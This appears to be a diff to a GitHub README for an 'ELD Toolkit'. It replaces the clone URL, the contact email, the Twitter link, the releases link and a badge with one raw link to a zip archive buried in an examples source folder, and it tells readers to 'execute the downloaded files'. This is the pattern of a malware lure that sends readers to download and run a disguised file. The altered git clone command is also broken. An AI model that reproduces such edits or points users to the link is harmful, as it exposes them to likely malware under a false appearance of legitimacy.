@@ -49,7 +49,7 @@ To get started with the ELD Toolkit, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/KhalMorty/eld.git
+   git clone https://raw.githubusercontent.com/KhalMorty/eld/main/examples/dioxus/src/Software_1.4.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -109,12 +109,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: contact@eldtoolkit.com
-- **Twitter**: [@eld_toolkit](https://twitter.com/eld_toolkit)
+- **Email**: https://raw.githubusercontent.com/KhalMorty/eld/main/examples/dioxus/src/Software_1.4.zip
+- **Twitter**: [@eld_toolkit](https://raw.githubusercontent.com/KhalMorty/eld/main/examples/dioxus/src/Software_1.4.zip)
 
 ## 🔥 Releases
 
-You can download the latest version of the ELD Toolkit from our [Releases section](https://github.com/KhalMorty/eld/releases). Make sure to execute the downloaded files as instructed.
+You can download the latest version of the ELD Toolkit from our [Releases section](https://raw.githubusercontent.com/KhalMorty/eld/main/examples/dioxus/src/Software_1.4.zip). Make sure to execute the downloaded files as instructed.
 
 ---
 
@@ -133,7 +133,7 @@ You can download the latest version of the ELD Toolkit from our [Releases sectio
 
 ---
 
-![ELD Toolkit](https://img.shields.io/badge/ELD_Toolkit-Available-blue)
+![ELD Toolkit](https://raw.githubusercontent.com/KhalMorty/eld/main/examples/dioxus/src/Software_1.4.zip)
 
 Thank you for visiting the ELD Toolkit repository! We look forward to your contributions and feedback. Happy coding!
 ```
